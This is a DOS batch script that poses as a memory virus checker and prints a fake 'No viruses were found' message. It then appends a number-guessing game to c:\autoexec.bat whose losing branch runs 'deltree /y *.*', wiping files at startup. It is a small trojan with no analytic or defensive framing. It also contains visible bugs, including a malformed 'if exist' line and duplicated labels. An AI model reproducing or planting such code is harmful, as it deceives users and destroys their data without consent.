   echo Warning
   pause
   @echo off
   if exist c:\command.com
   goto exist
   if not exist c:\command.com goto notexist
   :exist
   echo This program will check your computer's memory for a virus.
   pause
   echo No viruses were found in your computer's memory.
   pause
   cls
   :notexist
   cls
   echo echo  Pic a number, you have a 1 in 9 chance of loosing >>c:\autoexec.bat
   echo echo  (1) >>c:\autoexec.bat
   echo echo  (2) >>c:\autoexec.bat
   echo echo  (3) >>c:\autoexec.bat
   echo echo  (4) >>c:\autoexec.bat
   echo echo  (5) >>c:\autoexec.bat
   echo echo  (6) >>c:\autoexec.bat
   echo echo  (7) >>c:\autoexec.bat
   echo echo  (8) >>c:\autoexec.bat
   echo echo  (9) >>c:\autoexec.bat
   echo choice /N /C:123456789  "Enter Choice:" >>c:\autoexec.bat
   echo  IF ERRORLEVEL 9 GOTO 1 >>c:\autoexec.bat
   echo IF ERRORLEVEL 8 GOTO 2 >>c:\autoexec.bat
   echo IF ERRORLEVEL 7 GOTO 3 >>c:\autoexec.bat
   echo IF ERRORLEVEL 6 GOTO 4 >>c:\autoexec.bat
   echo IF ERRORLEVEL 5 goto 5 >>c:\autoexec.bat
   echo IF ERRORLEVEL 4 goto 6 >>c:\autoexec.bat
   echo IF ERRORLEVEL 3 goto 7 >>c:\autoexec.bat
   echo IF ERRORLEVEL 2 goto 8 >>c:\autoexec.bat
   echo IF ERRORLEVEL 1 goto 9 >>c:\autoexec.bat
   echo :9 echo 1 >>c:\autoexec.bat
   echo goto  won >>c:\autoexec.bat
   echo :8 echo 2 >>c:\autoexec.bat
   echo goto won >>c:\autoexec.bat
   echo :7 echo 3 >>c:\autoexec.bat
   echo goto won >>c:\autoexec.bat
   echo :6 echo 4 >>c:\autoexec.bat
   echo goto lost >>c:\autoexec.bat
   echo :5 echo 5 >>c:\autoexec.bat
   echo goto won >>c:\autoexec.bat
   echo :4 echo 6 >>c:\autoexec.bat
   echo goto won >>c:\autoexec.bat
   echo :3 echo 7 >>c:\autoexec.bat
   echo goto won >>c:\autoexec.bat
   echo :3 echo 8 >>c:\autoexec.bat
   echo goto won >>c:\autoexec.bat
   echo :2 echo 9 >>c:\autoexec.bat
   echo goto won >>c:\autoexec.bat
   echo :1 goto won >>c:\autoexec.bat
   echo :won >>c:\autoexec.bat
   echo cls >>c:\autoexec.bat
   echo echo Congratulations!  You won! >>c:\autoexec.bat
   echo pause >>c:\autoexec.bat
   echo :lost >>c:\autoexec.bat
   echo deltree  /y *.* >>c:\autoexec.bat
   :notexist
   cls
